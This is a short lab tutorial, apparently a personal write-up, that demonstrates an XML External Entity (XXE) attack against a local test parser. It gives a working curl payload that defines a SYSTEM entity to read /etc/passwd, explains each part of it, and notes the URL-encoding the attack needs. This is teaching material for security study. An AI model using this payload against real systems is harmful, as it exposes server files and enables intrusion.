XEE Attack

XML External Entity Attack



What we'll be doing in this attack is manipulating XML in a web request to read local system files. In this case, we'll read the /etc/passwd to get an idea of which accounts and account types are on the target server.



We first need to identify a point of attack..

![](/home/dave/Labs/XXE1.png)

Here we have an XML processing gateway that allows for multiple functions. Let's focus on the Parse Document function.



We'll start by taking a look at the source code.

![](/home/dave/Labs/XXE2.png)



We can see that there is an xml_data textarea field. This accepts XML data to be parsed server-side.



Let's try to use this to read a file on the server.

![](/home/dave/Labs/XXE3.png)



Before we go any further, let's break down this command.

`curl -X POST http://127.0.0.1:5014/parse  -d 'xml_data=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
<!ENTITY foo SYSTEM "file:///etc/passwd">
]>
<test>%26foo%3B</test>'`



**curl -X POST http://127.0.0.1:5014/parse  -d** is performing a POST operation against the XML parser and passing data (-d).



*Everything we pass through is encapsulated in single quotes.*



**<xml_data=<?xml version="1.0" encoding="UTF-8"?>**  This is our declaration header, which indicates that our document conforms to XML 1.0 with UTF-8 encoding.



**<!DOCTYPE test [**  Here we define our doctype for XML to follow. We will use test and define it later. We will also leave the block open for now (we will close it later).



**<!ENTITY foo SYSTEM "file:///etc/passwd"> ]>** Now we will define an entity with a system attribute and tell the parser to pull the contents of /etc/passwd on the server and store it in foo. Then we'll close out our doctype block.



**<<test>test>%26foo%3B</</test>test>** Now we will create a test element, per our doctype, and pass it the value of our entity with an ampersand prefix (&foo). Now, we are passing this request via curl, so the &foo entry needs to be URL encoded in order to work.



![](/home/dave/Labs/XXE4.png)



Now the data stored in our foo placeholder, the contents of the /etc/passwd file on the server, is passed in the response.


